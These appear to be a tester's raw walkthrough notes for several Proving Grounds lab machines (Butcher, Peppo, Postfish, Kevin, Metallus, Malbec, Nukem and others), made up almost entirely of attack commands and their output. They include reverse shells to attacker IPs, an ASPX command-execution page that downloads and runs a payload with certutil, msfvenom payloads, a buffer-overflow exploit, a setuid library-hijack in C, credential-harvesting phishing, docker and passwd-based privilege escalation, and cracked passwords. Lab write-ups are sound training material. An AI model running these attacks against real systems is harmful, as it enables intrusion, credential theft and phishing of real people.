	#no entry and nothing usefull information inside database
	#quit postgres
>\q
>sudo -l
	(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
	#find writable file
>find / -group cmeeks 2>/dev/null
>find / -writable 2>/dev/null | grep -v home
	/etc/systemd/system/pythonapp.service
	#abuse pythonapp.service, so I change/create service and abuse it as root
>cat /etc/systemd/system/pythonapp.service
	...
	User=root
>sudo reboot
	#python app wil run as root, when got reverse shell as root also
curl -X POST "http://192.168.226.117:50000/verify" -H "accept: application/json" -d 'code=os.system("nc -e /bin/bash 192.168.49.226 80")'
>whoami
	root



Butcher ProvingGrounds
==========================================
sudo netdiscover
sudo autorecon 192.168.70.63
cat fullnmap                                                                                                                                                                               1 ⨯
	21/tcp   open  ftp           Microsoft ftpd
	25/tcp   open  smtp          Microsoft ESMTP 10.0.17763.1
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds?
	450/tcp  open  http          Microsoft IIS httpd 10.0
	5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	#bruteforce everything
hydra -l butch -e nsr 192.168.229.63 ftp
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/Names/names.txt -t 192.168.229.63 -p 25 -m 1 -w 20
hydra -l butch -e nsr 192.168.229.63 ftp
crackmapexec smb 192.168.229.63 -u user.txt -p /opt/pass.txt
hydra -l admin -P /opt/rockyou.txt -s 450 192.168.229.63 http-post-form '/defaullt.aspx:payload:status'
hydra -l admin -P /opt/rockyou.txt -s 450 192.168.229.63 http-post-form '/:__VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk%2BMueM%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQlk%2FdmKT4Sorxxd%2FxByuYXG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo%2BjB%2FFoQ%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=^USER^&ctl00%24ContentPlaceHolder1%24PasswordTextBox=^PASS^&ctl00%24ContentPlaceHolder1%24LoginButton=Enter:F=Invalid username or passkey'
	#it should success if I change user to butch
http://192.168.70.63:450/
	#butcher repository, handmade website asp net
gobuster dir -u http://192.168.229.63:450/ -w /opt/directory-list-lowercase-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .html,.asp,.aspx,.txt
	/dev
http://192.168.70.63:450/dev/site.master.txt
	#backup site.master
http://192.168.70.63:450/default.aspx
	#try to bypass login with sqli auth bypass payload, turn out ausername input are vulnerable to sqli
sqlmap -r req2.txt --dbs --dbms mssql
sqlmap -r req2.txt --dbs --dbms mssql --dump --no-cast --batch
	+---------+----------+------------------------------------------------------------------+
	| user_id | username | password_hash                                                    |
	+---------+----------+------------------------------------------------------------------+
	| 1       | butch    | e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 |
	+---------+----------+------------------------------------------------------------------+
	#looking up cracked as awesomedude
http://192.168.70.63:450/repo.aspx
	#upload file, but cannot upload aspx file, i try txt success
	#as walktrough says, upload site.master will append original site.master, from that we can get rce on IIS 10
cp site.master.txt site.master
cat site.master
	<%
	string stdout = "";
	string cmd = "whoami";
	System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
	procStartInfo.RedirectStandardOutput = true;
	procStartInfo.UseShellExecute = false;
	procStartInfo.CreateNoWindow = true;
	System.Diagnostics.Process p = new System.Diagnostics.Process();
	p.StartInfo = procStartInfo;
	p.Start();
	stdout = p.StandardOutput.ReadToEnd();
	Response.Write(stdout);
	%>
http://192.168.70.63:450/repo.aspx
	nt authority\system
	#reverse shell
cat site.master
	<%
	string stdout = "";
	ArrayList commands = new ArrayList();
	commands.Add("certutil.exe -urlcache -split -f \"http://192.168.49.65:445/shell.exe\" \"C:\\inetpub\\wwwroot\\shell.exe\"");
	commands.Add("\"C:\\inetpub\\wwwroot\\shell.exe\"");
	foreach (string cmd in commands) {
		System.Threading.Thread.Sleep(3000);
		System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
		procStartInfo.RedirectStandardOutput = true;
		procStartInfo.UseShellExecute = false;
		procStartInfo.CreateNoWindow = true;
		System.Diagnostics.Process p = new System.Diagnostics.Process();
		p.StartInfo = procStartInfo;
		p.Start();
		stdout = p.StandardOutput.ReadToEnd();
		Response.Write(stdout);
	}
	%>
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.70 LPORT=21 -f exe > rshell.exe
python -m SimpleHTTPServer 445
rlwrap nc -lvp 21
>whoami
	nt authority\system
	#I tried another execution as system like add user to administrator but sadly user created but no way to log in
	#one success is put cmd.aspx
cat site.master
	<%
	string stdout = "";
	string cmd = "certutil -urlcache -split -f http://192.168.49.70:445/cmd.aspx \"C:\\inetpub\\wwwroot\\cmd.aspx\"";
	System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
	procStartInfo.RedirectStandardOutput = true;
	procStartInfo.UseShellExecute = false;
	procStartInfo.CreateNoWindow = true;
	System.Diagnostics.Process p = new System.Diagnostics.Process();
	p.StartInfo = procStartInfo;
	p.Start();
	stdout = p.StandardOutput.ReadToEnd();
	Response.Write(stdout);
	%>
http://192.168.70.63:450/cmd.aspx
>whoami
	nt authority\system








Peppo ProvingGrounds
===========================================
sudo autorecon 192.168.70.60
sudo nmap -p- 192.168.70.60 -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
	53/tcp    closed domain
	113/tcp   open   ident             FreeBSD identd
	5432/tcp  open   postgresql        PostgreSQL DB 9.6.0 or later
	8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
	10000/tcp open   snet-sensor-mgmt?
http://192.168.70.60:8080
	#redmine
gobuster dir -u http://192.168.70.60:8080 -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400
http://192.168.70.60:8080/login
	#login as admin:admin success
http://192.168.70.60:8080/my/password
	#website force to change password, bypass it by open issues.json or other json for api request and violla bypass password change
http://192.168.70.60:8080/issues.json
http://192.168.70.60:8080/admin
	#check version redmine
http://192.168.70.60:8080/admin/info
	Redmine version                4.1.1.stable
	Ruby version                   2.6.6-p146 (2020-03-31) [x86_64-linux]
	Rails version                  5.2.4.2
	#try to get upload something got nothing since php file doesn't count because webserver using ruby
	#try to get rce but version doesn't match
http://192.168.70.60:10000
	hello world!
gobuster dir -u http://192.168.70.60:10000 -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400
	#all directory has response as hello world, indicate that this is may hello world docker image
	#enumerate port 113 identd
	#https://book.hacktricks.xyz/pentesting/113-pentesting-ident
	#so ident as far I know are service to identify owner of service running on every port, what a usefull service for attacker lol
ident-user-enum 192.168.70.60 22 53 133 5432 8080 10000
	192.168.70.60:22        root
	192.168.70.60:53        <unknown>
	192.168.70.60:133       <unknown>
	192.168.70.60:5432      <unknown>
	192.168.70.60:8080      <unknown>
	192.168.70.60:10000     eleanor
wget https://github.com/brokensound77/identipy/raw/master/identi.py
python identi.py 192.168.70.60 -q 22 53 113 5432 8080 10000
	[*] Results:
         Port  Username             Banner
         ----  --------             ------
           22:  root                SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
          113:  nobody              0 , 0 : ERROR : INVALID-PORT
        10000:  eleanor
	#enumerate postgresql
psql -h 192.168.70.60 -p 5432 -U postgres -d postgres
>select version();
	PostgreSQL 12.3 (Debian 12.3-1.pgdg100+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
>CREATE TABLE cmd_exec(cmd_output text);
>COPY cmd_exec FROM PROGRAM 'id';
>SELECT * FROM cmd_exec;
>DROP TABLE IF EXISTS cmd_exec;
>COPY cmd_exec FROM PROGRAM 'which nc';
	ERROR:  program "which nc" failed
>COPY cmd_exec FROM PROGRAM '/bin/bash -c "bash -i >& /dev/tcp/192.168.49.70/53 0>&1"';
nc -lvp 53
>whoami
	postgres
	#upgrade shell with script
>which script
	/usr/bin/script
	#upgrade shell script
>SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
>whoami
	postgres
>ls -la /
	-rwxr-xr-x   1 root root    0 Jun  1  2020 .dockerenv
	#postgres inside docker, and I can't even get root so I moveon
	#shell as elanor since there are username who own port 10000 are elanor
hydra -l eleanor -e nsr -P /opt/rockyou.txt  192.168.70.60 ssh
	[22][ssh] host: 192.168.70.60   login: eleanor   password: eleanor
ssh eleanor@192.168.70.60
>whoami
	-rbash: cd: restricted
	#escape rbash escape
>echo $PATH
	/home/elanor/bin
>ls bin
	chmod chown ed ls mv ping sleep touch
	#search every binary on gtfobins
	#ed escape
>ed
>!/bin/bash
>export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/usr/local/games:$PATH
>bash linpeas.sh | tee eleanor-peppo-linpeas.txt
	#docker gorup privesc
>id
	uid=1000(eleanor) gid=1000(ele....,999(docker)
>docker ps
	CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
	326cfee15738        postgres            "docker-entrypoint.s…"   17 months ago       Up 15 months        0.0.0.0:5432->5432/tcp   postgres
	71aa857fe988        redmine             "/docker-entrypoint.…"   17 months ago       Up 15 months        0.0.0.0:8080->3000/tcp   redmine
	#docker privesc are quite easy if the box got internet connection
	#since it is not have any internet connection so I pull manually docker image and save it to target and load locally
sudo apt-get install docker.io
docker pull alpine
	Error response from daemon: Head "https://registry-1.docker.io/v2/library/alpine/manifests/latest": .....0:53: i/o timeout
	#got error, restart docker
sudo systemctl daemon-reload
sudo systemctl restart docker
docker pull alpine
docker images
	REPOSITORY   TAG       IMAGE ID       CREATED      SIZE
	alpine       latest    0a97eee8041e   3 days ago   5.61MB
docker save --output alpine.tar 0a97eee8041e
>wget 192.168.49.70:22/alpine.tar
>docker load --input alpine.tar
>docker images
	REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
	<none>              <none>              0a97eee8041e        3 days ago          5.61MB
	redmine             latest              0c8429c66e07        18 months ago       542MB
	postgres            latest              adf2b126dda8        18 months ago       313MB
>docker tag 0a97eee8041e alpine:latest
>docker images
	REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
	alpine/alpine       latest              0a97eee8041e        3 days ago          5.61MB
	alpine              latest              0a97eee8041e        3 days ago          5.61MB
	redmine             latest              0c8429c66e07        18 months ago       542MB
	postgres            latest              adf2b126dda8        18 months ago       313MB
>docker run -v /:/mnt --rm -it alpine chroot /mnt sh
#whoami
	root
>docker run -v /etc:/mnt -it alpine
#cd /mnt
#cat shadow
	root:$6$MBTjh/R4$OxZz9ngLbGsUZc9Ya59ylu8GsHRWhJ8NsBFCBV729XEWQEcBx170TAXD4f97uCNGCwC0VJC7fvX8pWtHqYzW.0:18414:0:99999:7:::
#echo "rooot:z3Y6fq9si1hCQ:0:0:root:/root:/bin/bash" >> passwd
#exit
>su rooot
#whoami
	root
	##after read walktrough we can actually use existing image to have privesc with docker
>docker images
	REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
	<none>              <none>              0a97eee8041e        3 days ago          5.61MB
	redmine             latest              0c8429c66e07        18 months ago       542MB
	postgres            latest              adf2b126dda8        18 months ago       313MB
>docker run -v /:/mnt --rm -it redmine chroot /mnt sh
#whoami
	root









Postfish ProvingGrounds
========================================
sudo autorecon 192.168.70.137
cat fullnmap
	22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	25/tcp  open  smtp     Postfix smtpd
	80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
	110/tcp open  pop3     Dovecot pop3d
	143/tcp open  imap     Dovecot imapd (Ubuntu)
	993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
	995/tcp open  ssl/pop3 Dovecot pop3d
	#enumerate website
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.postfish.off" -u http://postfish.off/ -t 50 --hh 83
gobuster dir -u http://postfish.off/ -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .php,.html,.txt
nikto --host http://postfish.off
http://postfish.off/team.html
	#there are some name that potential to valid user
	#enumerate smtp
smtp-user-enum -M VRFY -U user.txt -t 192.168.70.137 -p 25 -m 1 -v -w 20
smtp-user-enum -M VRFY -U email.txt -t 192.168.70.137 -p 25 -m 1 -v -w 20
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/Names/names.txt -t 192.168.70.137 -p 25 -m 1 -w 20
	192.168.70.137: bin exists
	192.168.70.137: hr exists
	192.168.70.137: irc exists
	192.168.70.137: mail exists
	192.168.70.137: man exists
	192.168.70.137: root exists
	192.168.70.137: sales exists
	192.168.70.137: sys exists
	#enumerate user with cewl
cewl -w cewl.txt -d 10 -m 3 --with-numbers http://postfish.off/team.html
cat cewl.txt| tr '[:upper:]' '[:lower:]' >> cewl.txt
smtp-user-enum -M VRFY -U cewl.txt -t 192.168.70.137 -p 25 -m 1 -v -w 20
	192.168.92.137: sales exists
	192.168.92.137: legal exists
	#there are fastest way to enumerate user
wget https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py
cat asd.txt
	claire madison
	mike ross
	brian moore
	sarah lorem
python usernamer.py -f asd.txt > dsa.txt
smtp-user-enum -M VRFY -U dsa.txt -t 192.168.104.137 -p 25 -m 5 -w 20
	192.168.104.137: claire.madison exists
	192.168.104.137: mike.ross exists
	192.168.104.137: brian.moore exists
	192.168.104.137: sarah.lorem exists
	#so I create validuser.txt and hydra using nsr
hydra -l sales@postfish.off -P cewl.txt  192.168.92.137 pop3
hydra -L validuser.txt -e nsr 192.168.92.137 pop3
	[110][pop3] host: 192.168.92.137   login: sales   password: sales
	#got valid user sales sales, read email
	#read email imap
telnet 192.168.92.137 143
>A01 CAPABILITY
>A02 LOGIN sales sales
>A03 LIST "" *
	* LIST (\HasNoChildren) "/" INBOX
>A05 SELECT INBOX
	1 EXISTS
>A06 FETCH 1 BODY.PEEK[]
	From: it@postfish.off
	Hi Sales team,
	We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.
	#read email pop3
nc 192.168.92.137 110
>USER sales
>PASS sales
>list
	1 683
>retr 1
	From: it@postfish.off
	Hi Sales team,
	We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.
	#send phishing email
	#i tried to send email as sales but no response, actually I can send email as it also
swaks --to sarah.lorem@postfish.off,brian.moore@postfish.off,mike.ross@postfish.off,claire.madison@postfish.off --from it@postfish.off --header "Subject: test" --body "please click here http://192.168.49.92/jembot" --server 192.168.92.137
nc -lvp 80
	first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE
	#got pass EternaLSunshinE
ssh brian.moore@192.168.92.137
>bash linpeas.sh | tee brian-postfish-linpeas.txt
>id
	uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
	#there are filter group that idk
>find / -group filter 2>/dev/null
	/etc/postfix/disclaimer
	/var/spool/filter
	#I can edit disclaimer thing, and that is bash text, I add my reverse shell and try to trigger it
	#finally it trigger when I send email
>./pspy64
	2021/11/17 11:35:42 CMD: UID=997  PID=81114  | /bin/bash /etc/postfix/disclaimer -f it@postfish.off -- it@postfish.off
	#but there is no coming reverse shell
	#after read walktrough I did the right thing, what makes it fail
	#1) I edit with nano, so when save it box doesn't have any space
	#2) there are script from root to reset disclaimer
>whoami
	brian.moore
	##abuse disclaimer privesc
	#https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze
	#user in list /etc/postfix/disclaimer_addresses will execute /etc/postfix/disclaimer when send or receive email and takes contain /etc/postfix/discalimer.txt
>cat /etc/postfix/disclaimer_addresses
	it@postfish.off
	brian.moore@postfish.off
	#so when it@postfish.off send or receive email will execute /etc/postfix/disclaimer
>nano /etc/postfix/disclaimer
	# Localize these.
	bash -c "bash -i >& /dev/tcp/192.168.49.104/22 0>&1"
	.....
nc -lvp 22
swaks --to it@postfish.off --from it@postfish.off --header "Subject: test" --body "please " --server 192.168.104.137
>whoami
	filter
>sudo -l
	(ALL) NOPASSWD: /usr/bin/mail *
	#privesc mail privesc
>sudo mail --exec='!/bin/bash'
#whoami
	root








Kevin ProvingGrounds
=========================================
sudo autorecon 192.168.104.45
cat fullnmap
	80/tcp    open  http               GoAhead WebServer
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
	3389/tcp  open  ssl/ms-wbt-server?
http://192.168.104.45/index.asp
	#can login as admin:admin
http://192.168.104.45/CPage/Header3.asp
	HP Power Manager 4.2 (Build 7)
	#exploit hp power manager buffer overflow
searchsploit hp power manager
	Hewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow		| windows/remote/10099.py
msfvenom -e x86/alpha_mixed --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 EXITFUNC=thread -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
msfvenom -e x86/alpha_mixed -p windows/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
python 10099.py 192.168.104.45
	#I tried using this exploit failed, got another one that working on github
wget https://github.com/Muhammd/HP-Power-Manager/raw/master/hpm_exploit.py
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
python hpm_exploit.py 192.168.104.45
nc -lvp 80
>whoami
	nt authority\system




Metallus ProvingGrounds
============================================
sudo autorecon 192.168.104.96
cat fullnmap
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	5040/tcp  open  unknown
	12000/tcp open  cce4x?
	22222/tcp open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
	40443/tcp open  unknown
	49837/tcp open  java-rmi      Java RMI
http://192.168.104.96:40443/index.do
	#can login as admin:admin
	#I trough this will be the exploit, but no then I manage to do it manually
searchsploit 39236
	Manage Engine Application Manager 12.5 - Arbitrary Command Execution		| multiple/webapps/39236.py
proxychains python 39236.py 192.168.104.96 40443 /
	#exploit manual
http://192.168.104.96:40443/admin/userconfiguration.do?method=editUser&username=admin&userid=1#uc/LocalAuth
	#update user as administrator / super admin
http://192.168.104.96:40443/admin/userconfiguration.do?method=editUser&username=admin&userid=1#uc/LocalAuth
	Allow Delegated Admin user(s) to create Execute Program Actions
	#check all permision
	#Manage Engine Application Manager RCE manual
http://192.168.104.96:40443/Upload.do
	 Upload Script to <Product_Home>/working/
http://192.168.104.96:40443/common/executeScript.do?method=testAction&actionID=10000007&haid=null
	#add new script
	#check windows version
crackmapexec smb 192.168.104.96 -u guest -p guest                                                                                                                                          1 ⨯
	SMB         192.168.104.96  445    METALLUS         [*] Windows 10.0 Build 18362 (name:METALLUS) (domain:Metallus) (signing:False) (SMBv1:False)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe > rshell.exe
http://192.168.104.96:40443/common/executeScript.do?method=testAction&actionID=10000007&haid=null
	#add new script
http://192.168.104.96:40443/adminAction.do?method=showExecProgAction&haid=null
	display name: test
	program to execute: cmd.exe /c certutil.exe -urlcache -split -f http://192.168.49.104/rshell.exe C:\temp\rshell.exe
	direcrtory execute program: C:\Windows\system32\
	#create action and run
pythom -m SimpleHTTPServer 80
	192.168.104.96 - - [17/Nov/2021 11:28:09] "GET /rshell.exe HTTP/1.1" 200 -
http://192.168.104.96:40443/adminAction.do?method=showExecProgAction&haid=null
	display name: test
	program to execute: cmd.exe /c C:\temp\rshell.exe
	direcrtory execute program: C:\Windows\system32\
>whoami
	nt authority\system
	#and here what walktrough did, RCE ManageEngine Applications Manager 14700
	#one thing should get better search on searchsploit
searhsploit manageengine application manager
searchsploit 48793                                                                                                                                                                         1 ⨯
	ManageEngine Applications Manager 14700 - Remote Code Execution (Authenticated)		| java/webapps/48793.py
python3 48793.py http://192.168.104.96:40443 admin admin 192.168.49.104 80
	...
	[*] Check your shell...
nc -lvp 80
>whoami
	nt authority\system










Malbec ProvingGrounds
===========================================
sudo autorecon 192.168.104.129
cat fullnmap
	22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	2121/tcp open  ftp     pyftpdlib 1.5.6
	7138/tcp open  unknown
ftp -p 192.168.104.129 2121
>get malbec.exe
	#shit buffer overflow :(
	#spawn my windows vm
nc 10.1.1.87 7138
	asdasdasd
	asdasdasd
	#so just like brainpan 1
python fuzz.py
	crash at 400
msf-pattern_create -l 1000
msf-pattern_offset -q 6C41336C
	[*] Exact match at offset 340
!mona jmp -r esp
	0x41101503
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00\x0a' exitfunc=thread
msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.49.104 lport=22 -b '\x00\x0a' exitfunc=thread -f c
cat ex.py
	buf = 'A'*340
	eip = struct.pack("<I",0x41101503)
	nop='\x90'*16
	esp='C'*(1000-340-4-16-len(shell))
	buffer=buf+eip+nop+shell+esp
nc -lvp 22
>whoami
	carlos
>find / -perm -4000 2>/dev/null
	/usr/bin/messenger
>/usr/bin/messenger
	/usr/bin/messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
	#shared object injection library injection
>which bash
	/usr/bin/bash
>cat lib.c
	#include <stdio.h>
	#include <stdlib.h>
	static void hijack() __attribute__((constructor));
	void hijack() {
	setuid(0);
	system("/usr/bin/bash -p"); }
>gcc -shared -fPIC -o libmalbec.so lib.c
	gcc: error trying to exec 'cc1': execvp: No such file or directory
	#compile error so I have to compile on my box
>uname -a
	Linux malbec 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
gcc -shared -fPIC -o libmalbec.so lib.c
>nc 192.168.49.104 22 > libmalbec.so
>chmod 777 libmalbec.so
>/usr/bin/messenger
	/usr/bin/messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
	#still got error, as privsec from tiberius I move libmalbec.so on ~/.config
>cp libmalbec.so .config/
>cd .config
>/usr/bin/messenger
#id
	uid=0(root) gid=1000(carlos) groups=1000(carlos)
	#after read writeup we can compile on attacker, hijack dynamic library hijack
>ldd /usr/bin/messenger
	libmalbec.so => not found
>ls -l /etc/ld.so.conf.d/
	-rw-r--r-- 1 root root  14 Jan 26 04:43 malbec.conf
>cat /etc/ld.so.conf.d/malbec.conf
	/home/carlos/
	#shared library no carlos home directory
	#should run ldconfig to reload malbec.so library
cat /etc/crontab
	*/2 * * * * root /sbin/ldconfig
	#and yes library reload every 2 minutes
>gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
	gcc: error trying to exec 'cc1': execvp: No such file or directory
>export
	declare -x LS_COLORS=""
	declare -x OLDPWD
	declare -x PWD="/home/carlos"
	declare -x SHLVL="1"
	#there is no PATH exported
>echo $PATH
	/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
>export PATH
>gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
	#after 2 minuter (ldconfig run in cron) lld now reloaded
>ldd /usr/bin/messenger
	libmalbec.so => /home/carlos/libmalbec.so (0x00007f498cc00000)
>/usr/bin/messenger
#whoami
	root








Nukem ProvingGrounds
=========================================
sudo autorecon 192.168.104.105
cat fullnmap
	22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
	80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
	3306/tcp  open  mysql?
	5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)	
	13000/tcp open  http        nginx 1.18.0
	36445/tcp open  netbios-ssn Samba smbd 4.6.2
http://192.168.104.105/
	#wordpress
wpscan --url http://192.168.104.105 -e u,ap,at,cb,tt,cb,dbe --plugins-detection aggressive -o wpscan-out.txt
wpscan --url http://192.168.120.55/
	#some tips wpscan with aggressive and full enumeration takes like 2 hours to finish
	#so run default url first
gobuster dir -u http://192.168.104.105/index.php/ -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400
http://192.168.104.105/index.php/instructor-registration/
http://192.168.104.105/index.php/student-registration/
	#I can register as student and instructor, then that user is wordpress user with limited permision
http://192.168.104.105/index.php/dashboard/
http://192.168.104.105/index.php/dashboard/settings/
	#try to add avatar and temper to php, failed nothing change to php file
http://192.168.104.105/wp-admin/profile.php
	#so does when enter wordpress dashboard, user cannot even upload file
http://192.168.104.105/wp-content/uploads/2021/11/
	#as always default wordpress install will listing directory uploads
http://192.168.104.105/wp-content/uploads/
	[DIR]	2020/ 	2020-10-28 15:45 	- 	 
	[DIR]	2021/ 	2021-11-18 09:53 	- 	 
	[DIR]	simple-file-list/ 	2020-09-28 13:45 	- 	 
	#searching exploit simple file list wordpress turn out that is plugin wordpress that vulnerable to rce
	#https://therealcoiffeur.github.io/c0
	#check existing plugins
http://192.168.104.105/wp-content/uploads/simple-file-list/
http://192.168.104.105/wp-content/plugins/simple-file-list/ee-upload-engine.php
http://192.168.104.105/wp-content/plugins/simple-file-list/ee-file-engine.php
	#all directory and file are exist, might be vulnerable
	#exploit simple file list RCE
wget https://github.com/therealcoiffeur/therealcoiffeur.github.io/raw/master/tools/Wordpress/simple_file_list_4.2.2.py
python3 simple_file_list_4.2.2.py http://192.168.104.105
	[+] Exploit work !
		URL: http://192.168.104.105/wp-content/uploads/simple-file-list/2884.php
		Password: b18e655147c09aebb74492ef53f5159f
http://192.168.104.105/wp-content/uploads/simple-file-list/2884.php
POST /wp-content/uploads/simple-file-list/2884.php
password=b18e655147c09aebb74492ef53f5159f&cmd=id
	500 error
	#so I change payload to p0wny webshell, manual exploit it via burp suite
proxychains python3 simple_file_list_4.2.2.py http://192.168.104.105
http://192.168.104.105/wp-content/uploads/simple-file-list/asd.php
	/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.49.104/80 0>&1'
>whoami
	http
>cat wp-config.php
	define( 'DB_NAME', 'wordpress' );
	define( 'DB_USER', 'commander' );
	define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
ssh commander@192.168.104.105
>whoami
	commander
>mysql -u commander -p
>use wordpress;
>show tables;
>describe wp_users;
>select user_login,user_pass from wp_users;
	+------------+------------------------------------+
	| user_login | user_pass                          |
	+------------+------------------------------------+
	| admin      | $P$BoktR9dJnCOMHiLEnYkPfS1Ae/7vPq/ |
	+------------+------------------------------------+
hashcat -a 0 -m 400 hash.txt /opt/rockyou.txt
	#return forever and nothing
	#open up hint there are usefull setuid binary and need port forward to run
	#port forward ssh
>netstat -lntp
	tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      394/Xvnc
	#VNC are running
ssh -L 5901:localhost:5901 commander@192.168.104.105
vncviewer localhost::5901
	Password:CommanderKeenVorticons1990
>open dosbox
>echo "rooot:z3Y6fq9si1hCQ:0:0:root:/root:/bin/bash" >> passwd.txt
	#dosbox priviledge escalation
	#so dosbox are emulator to run game back in DOS computer
	#inside dosbox just like running cmd in windows, means we can read and copy file
	#https://www.instructables.com/How-to-use-DOSBox-for-Beginners/
Z:>help
Z:>mount C /
Z:>C:
C:>copy \home\commander\passwd.txt \etc\passwd
	#copy passwd to new passwd.txt file
>su rooot
#whoami
	root




Sybaris ProvingGrounds
========================================
sudo autorecon 192.168.104.93
cat fullnmap                                                                             1 ⚙
	21/tcp    open   ftp       vsftpd 3.0.2
	22/tcp    open   ssh       OpenSSH 7.4 (protocol 2.0)
	80/tcp    open   http      Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
	6379/tcp  open   redis     Redis key-value store 5.0.9
ftp -p 192.168.104.93
>ls
	drwxrwxrwx    2 0        0              37 Nov 18 06:19 pub
>cd pub
>put fullnmap
	#has write access
http://192.168.104.93/robots.txt
gobuster dir -u http://192.168.104.93/ -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .php,.txt
http://192.168.104.93/login
	#try to sqli login failed
	#try to sql search bar failed
	#enumerate username bruteforce wfuzz
wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt  -d "user=FUZZ&password=user&csrf_token=4eebfd56d8bd8d6996132ec9f0e2c7783a11b3b2&submit=Login" --hc 404 -H "Cookie: PHPSESSID=5p31dkg2dufihk71earbroovhp" -u http://192.168.104.93/login -t 50 --hh 3126
	000007489:   200        69 L     216 W      3129 Ch     "pablo"
http://192.168.104.93/login
	Your username and password mismatch
	#try to bruteforce login with wfuzz but hang when load rockyou.txt
